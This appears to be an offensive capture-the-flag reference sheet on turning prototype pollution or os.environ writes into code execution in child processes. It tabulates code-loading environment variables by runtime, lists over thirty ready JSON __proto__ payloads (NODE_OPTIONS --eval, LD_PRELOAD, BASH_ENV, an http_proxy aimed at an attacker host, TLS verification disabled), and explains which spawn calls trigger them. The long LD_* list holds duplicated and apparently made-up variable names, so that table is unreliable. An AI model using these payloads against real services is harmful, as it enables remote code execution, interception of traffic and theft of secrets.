# os.environ / env-var pollution — the cross-runtime env atlas

A polluted `env` object or an `os.environ` write is the highest-
yield spawn-time gadget — the child inherits whatever env map the
spawn call assembles, and several env vars load code on startup.

---

## 1. The env-load primitives by runtime

| Var | Runtime | What it does on child start |
|---|---|---|
| `NODE_OPTIONS` | node | CLI flags for every node process — `--require /tmp/x.js`, `--eval 'CODE'`, `--inspect=0.0.0.0:9229`, `--experimental-loader=file:///tmp/x.mjs`, `--import` |
| `LD_PRELOAD` | linux ld | preload `.so` — `LD_PRELOAD=/tmp/x.so` runs its constructor |
| `LD_LIBRARY_PATH` | linux ld | search dirs for `.so` — a planted same-name lib hijacks |
| `DYLD_INSERT_LIBRARIES` | macOS | the mac `LD_PRELOAD` — SIP-gated on system binaries |
| `DYLD_LIBRARY_PATH` | macOS | search dirs |
| `BASH_ENV` | bash non-interactive | source file on every `bash` startup — `BASH_ENV=/tmp/x` runs it on `sh -c` |
| `ENV` | sh/ksh | same for POSIX `sh`/`ksh` interactive startup |
| `PROMPT_COMMAND` | bash | runs before each prompt — interactive only |
| `PS1`/`PS4` | bash | prompt strings — command-substitution in prompts |
| `SHELLOPTS`/`BASHOPTS` | bash | options |
| `PYTHONPATH` | python | `sys.path` prepend — `import x` finds `/tmp/x.py` |
| `PYTHONSTARTUP` | python | runs on interactive startup — not scripts |
| `PYTHONWARNINGS`/`PYTHONINSPECT`/`PYTHONCASEOK`/`PYTHONIOENCODING`/`PYTHONHASHSEED`/`PYTHONNOUSERSITE`/`PYTHONUSERBASE`/`PYTHONEXECUTABLE`/`PYTHONBREAKPOINT`/`PYTHONMALLOC`/`PYTHONDEVMODE`/`PYTHONUTF8`/`PYTHONDONTWRITEBYTECODE`/`PYTHONUNBUFFERED`/`PYTHONVERBOSE`/`PYTHONOPTIMIZE`/`PYTHONDEBUG` | python | mostly behavior — `PYTHONSTARTUP`/`PYTHONPATH` are the code-loaders |
| `PERL5OPT` | perl | `-M/tmp/x` — a module loaded on every perl run |
| `PERL5LIB` | perl | `@INC` prepend |
| `RUBYOPT` | ruby | `-r/tmp/x` — require on every ruby run |
| `RUBYLIB` | ruby | `$LOAD_PATH` prepend |
| `GIT_SSH_COMMAND` | git | the ssh binary git uses — `GIT_SSH_COMMAND=/tmp/x` runs it |
| `GIT_SSH`/`GIT_EXEC_PATH`/`GIT_EXTERNAL_DIFF`/`GIT_EDITOR`/`GIT_PAGER`/`GIT_ASKPASS`/`SSH_ASKPASS`/`GIT_CONFIG`/`GIT_CONFIG_PARAMETERS`/`GIT_CONFIG_COUNT`/`GIT_TEMPLATE_DIR`/`GIT_HOOKS_PATH`/`GIT_CEILING_DIRECTORIES`/`GIT_DISCOVERY_ACROSS_FILESYSTEM`/`GIT_OBJECT_DIRECTORY`/`GIT_ALTERNATE_OBJECT_DIRECTORIES`/`GIT_INDEX_FILE`/`GIT_DIR`/`GIT_WORK_TREE`/`GIT_NAMESPACE`/`GIT_AUTHOR_*`/`GIT_COMMITTER_*` | git | the exec/path family — `GIT_SSH_COMMAND`/`GIT_EXTERNAL_DIFF`/`GIT_EDITOR`/`SSH_ASKPASS` are the code-loaders |
| `EDITOR`/`VISUAL`/`PAGER`/`MANPAGER`/`BROWSER` | unix tools | the editor/pager program — `vim`/`less`/`man`/`git`/`crontab`/`sudoedit`/`systemctl` read these |
| `SSH_ASKPASS`/`SUDO_ASKPASS`/`GIT_ASKPASS` | auth-prompts | runs on a password prompt |
| `http_proxy`/`https_proxy`/`HTTP_PROXY`/`HTTPS_PROXY`/`all_proxy`/`ALL_PROXY`/`no_proxy`/`NO_PROXY`/`ftp_proxy`/`FTP_PROXY` | http clients | a proxy the client honors — request-redirect |
| `PATH` | all | command-search order — `/tmp` first → a planted same-name binary |
| `HOME`/`USER`/`LOGNAME`/`SHELL`/`TERM`/`HOSTNAME`/`PWD`/`OLDPWD`/`LANG`/`LC_*`/`TZ`/`TMPDIR`/`TEMP`/`TMP`/`XDG_*` | env | config/context |
| `NODE_ENV`/`NODE_PATH`/`NODE_REPL_HISTORY`/`NODE_PENDING_DEPRECATION`/`NODE_PRESERVE_SYMLINKS`/`NODE_REDIRECT_WARNINGS`/`NODE_NO_WARNINGS`/`NODE_EXTRA_CA_CERTS`/`NODE_DISABLE_COLORS`/`NODE_FORCE_COLOR`/`FORCE_COLOR`/`NODE_V8_COVERAGE`/`NODE_V8_COVERAGE_DIR`/`UV_THREADPOOL_SIZE`/`UV_USE_IO_URING`/`OPENSSL_CONF`/`OPENSSL_CONF_<name>`/`SSL_CERT_FILE`/`SSL_CERT_DIR`/`REQUESTS_CA_BUNDLE`/`CURL_CA_BUNDLE`/`GIT_SSL_NO_VERIFY`/`NODE_TLS_REJECT_UNAUTHORIZED` | node/TLS | `NODE_EXTRA_CA_CERTS`/`OPENSSL_CONF`/`NODE_TLS_REJECT_UNAUTHORIZED=0` are the TLS-off primitives |
| `MALLOC_*`/`MALLOC_CHECK_`/`MALLOC_TRACE`/`MALLOC_ARENA_MAX`/`GLIBC_TUNABLES`/`LD_AUDIT`/`LD_DEBUG`/`LD_PROFILE`/`LD_SHOW_AUXV`/`LD_BIND_NOW`/`LD_BIND_NOT`/`LD_DYNAMIC_WEAK`/`LD_HWCAP_MASK`/`LD_ORIGIN_PATH`/`LD_POINTER_GUARD`/`LD_TRACE_LOADED_OBJECTS`/`LD_TRACE_PRELINKING`/`LD_WARN`/`LD_ASSUME_KERNEL`/`LD_USE_LOAD_BIAS`/`LD_VERBOSE`/`LD_VERSION`/`LD_NOLAZY`/`LD_BIND_NOW`/`LD_NOW`/`LD_PRELINK`/`LD_RUN_PATH`/`LD_SONAME`/`LD_OUTPUT`/`LD_DEFS`/`LD_LIBPATH`/`LD_LOADFLTR`/`LD_NOAUXFLTR`/`LD_NOCONFIG`/`LD_NODEFLIB`/`LD_NODIRECT`/`LD_NOENVVAR`/`LD_NOOBJRELOC`/`LD_NOPAREX`/`LD_NOPARTIAL`/`LD_NOVERSION`/`LD_ROOT`/`LD_SEC`/`LD_BREADTH`/`LD_INIT_FIRST`/`LD_LOAD`/`LD_LOADQ`/`LD_LIBPATH_DISABLE`/`LD_LOAD`/`LD_LIBRARY_PATH`/`LD_L`/`LD_PRELOAD`/`LD_PROFILE`/`LD_RUN`/`LD_SEARCH`/`LD_SIGNAL`/`LD_TRACE`/`LD_TRACE`/`LD_UNSET`/`LD_USER`/`LD_VERBOSE`/`LD_WARN`/`LD_WEAK` | ld.so | `LD_PRELOAD`/`LD_AUDIT`/`LD_LIBRARY_PATH`/`LD_DEBUG`/`LD_PROFILE` are the load/log primitives — `LD_AUDIT` loads an audit library like LD_PRELOAD |

The `LD_*` tail is the audit/debug family — `LD_PRELOAD`/`LD_AUDIT`
/`LD_LIBRARY_PATH`/`LD_DEBUG` are the operatives; the rest are
verbose but rarely the intended write.

## 2. The env-read sinks — who reads `os.environ`/`env` lazily

```python
os.environ.get('X', default)         # lazy — re-reads each call
os.environ['X']                       # KeyError on missing
os.getenv('X')                        # same as .get
os.getenv('X', default)               # with default
django.conf.settings.X                 # some settings read env lazily
os.environ.get('SECRET_KEY')          # signing key — lazy
os.environ.get('DATABASE_URL')        # db config — lazy
os.environ.get('REDIS_URL')           # cache config — lazy
os.environ.get('FLAG')                # the flag env — lazy read!
os.environ.get('DEBUG')               # debug gate — lazy
os.environ.get('ALLOWED_HOSTS')       # django hosts — lazy
os.environ.get('CELERY_BROKER')       # task queue — lazy
os.environ.get('STRIPE_KEY')          # api key — lazy
os.environ.get('SENTRY_DSN')          # sentry — lazy
```

A `os.environ.get('X')` read AFTER your env-write returns your
value — the `os.environ` dict itself is the shared state.

## 3. The env-write carriers

```json
{"__proto__":{"env":{"NODE_OPTIONS":"--eval 'CODE'"}}}
{"__proto__":{"env":{"LD_PRELOAD":"/tmp/x.so"}}}
{"__proto__":{"env":{"BASH_ENV":"/tmp/x"}}}
{"__proto__":{"env":{"PATH":"/tmp"}}}
{"__proto__":{"env":{"PYTHONPATH":"/tmp"}}}
{"__proto__":{"env":{"http_proxy":"http://attacker"}}}
{"__proto__":{"env":{"GIT_SSH_COMMAND":"/tmp/x"}}}
{"__proto__":{"env":{"EDITOR":"/tmp/x"}}}
{"__proto__":{"env":{"PAGER":"/tmp/x"}}}
{"__proto__":{"env":{"NODE_EXTRA_CA_CERTS":"/tmp/ca.pem"}}}
{"__proto__":{"env":{"NODE_TLS_REJECT_UNAUTHORIZED":"0"}}}
{"__proto__":{"env":{"SSL_CERT_FILE":"/tmp/ca.pem"}}}
{"__proto__":{"env":{"REQUESTS_CA_BUNDLE":"/tmp/ca.pem"}}}
{"__proto__":{"env":{"CURL_CA_BUNDLE":"/tmp/ca.pem"}}}
{"__proto__":{"env":{"GIT_SSL_NO_VERIFY":"1"}}}
{"__proto__":{"env":{"OPENSSL_CONF":"/tmp/x.cnf"}}}
{"__proto__":{"env":{"MALLOC_TRACE":"/tmp/x"}}}
{"__proto__":{"env":{"LD_AUDIT":"/tmp/x.so"}}}
{"__proto__":{"env":{"LD_DEBUG":"files"}}}
{"__proto__":{"env":{"LD_PROFILE":"x"}}}
{"__proto__":{"env":{"GLIBC_TUNABLES":"glibc.malloc.check=1"}}}
{"__proto__":{"env":{"HOME":"/tmp"}}}
{"__proto__":{"env":{"SHELL":"/tmp/x"}}}
{"__proto__":{"env":{"TERM":"x"}}}
{"__proto__":{"env":{"USER":"root"}}}
{"__proto__":{"env":{"LOGNAME":"root"}}}
{"__proto__":{"env":{"HOSTNAME":"attacker"}}}
{"__proto__":{"env":{"LANG":"x"}}}
{"__proto__":{"env":{"TZ":"x"}}}
{"__proto__":{"env":{"TMPDIR":"/tmp"}}}
{"__proto__":{"env":{"XDG_CONFIG_HOME":"/tmp"}}}
{"__proto__":{"env":{"XDG_DATA_HOME":"/tmp"}}}
{"__proto__":{"env":{"XDG_CACHE_HOME":"/tmp"}}}
{"__proto__":{"env":{"XDG_RUNTIME_DIR":"/tmp"}}}
```

For Python the `os.environ` write comes via a `set_path`/dict-update
to `__globals__.os.environ` — see `python-paths.md`.

## 4. The env-read trigger — a spawn must happen

```js
// the polluted env only pays when a spawn reads it
spawn('convert', args, {env: merged})   // env: polluted
exec('node sub.js', {env: merged})
fork('sub.js', [], {env: merged})
new Worker('sub.js', {env: merged})
```

The trigger: ANY subsequent `spawn`/`exec`/`fork`/`Worker`/`system`/
`subprocess` call whose env map inherits the polluted `env` object.
The `env` name is the option key — the polluted `env` object itself
must reach `opts.env`.

## 5. The child-process env-inheritance model

```js
spawn(cmd, {env: X})    // child gets X as its WHOLE env — replaces
spawn(cmd)              // child inherits process.env — the parent's
spawn(cmd, {env: {...process.env, X}})  // inherits + adds X
```

`opts.env` REPLACES the child env — a polluted `env` object without
PATH means the child has no PATH — `spawn('ls')` fails with ENOENT
because `ls` isn't found. Include `PATH` in the polluted env.

## 6. The `process.env` write (not via `env` opts)

```js
// a merge INTO process.env — direct env pollution in the parent
merge(process.env, req.body)
// {"NODE_OPTIONS":"--require /tmp/x","PATH":"/tmp"}
// every subsequent spawn inherits process.env — the parent-env write
```

A merge into `process.env` itself is the stronger primitive — it
affects ALL future children, not just one `opts.env` read.

## 7. The env-name → payoff quick table

```text
NODE_OPTIONS  → node child code-exec (--require/--eval/--inspect)
LD_PRELOAD    → .so load on every spawned binary
LD_AUDIT      → audit-library load
BASH_ENV      → sh -c startup file
PYTHONPATH    → import hijack on python children
PERL5OPT      → -M load on perl children
RUBYOPT       → -r load on ruby children
GIT_SSH_COMMAND / GIT_EXTERNAL_DIFF / GIT_EDITOR → git-exec
EDITOR/PAGER  → editor-spawn on interactive tools
SSH_ASKPASS/SUDO_ASKPASS → auth-prompt exec
PATH          → same-name binary hijack
http_proxy    → client request-redirect
NODE_EXTRA_CA_CERTS/SSL_CERT_FILE/REQUESTS_CA_BUNDLE → CA-inject
NODE_TLS_REJECT_UNAUTHORIZED=0 → TLS-verify off
OPENSSL_CONF  → openssl config-file load
HOME          → config-file search path
TMPDIR        → temp-file location
FLAG (a flag env var) → direct env read if the app leaks it
```

## 8. The falsifiers

- `opts.env` isn't inherited — the spawn builds its own env map
  explicitly (`{env: clean}`) — the polluted `env` is ignored.
- The env-write is per-request — the child's env is built fresh —
  no shared `env` object exists to pollute.
- The spawn runs before the write — no trigger follows the pollution.
- The env var is read once at startup, not lazily — a write after
  startup doesn't affect it.
- `spawn` isn't reachable from the polluted-object's call path.

## 9. The ledger

```bash
python3 tools/state.py <c> --hypothesis "env-pollution: opts.env.NODE_OPTIONS"
# refutes when: spawn builds env explicitly; or no spawn follows the
# write; or the var is startup-read-only; or env object isn't shared
```
